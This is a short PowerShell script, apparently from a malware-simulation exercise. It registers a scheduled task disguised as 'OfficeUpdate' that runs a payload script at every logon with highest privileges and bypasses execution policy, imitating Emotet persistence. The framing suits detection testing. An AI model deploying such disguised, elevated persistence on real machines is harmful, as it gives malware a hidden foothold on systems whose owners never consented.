# schedule_task.ps1
$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File C:\MalwareSim\payload.ps1"
$Trigger = New-ScheduledTaskTrigger -AtLogOn
Register-ScheduledTask -TaskName "OfficeUpdate" -Action $Action -Trigger $Trigger -RunLevel Highest -Description "Simulate Emotet persistence" -User "$env:USERNAME"
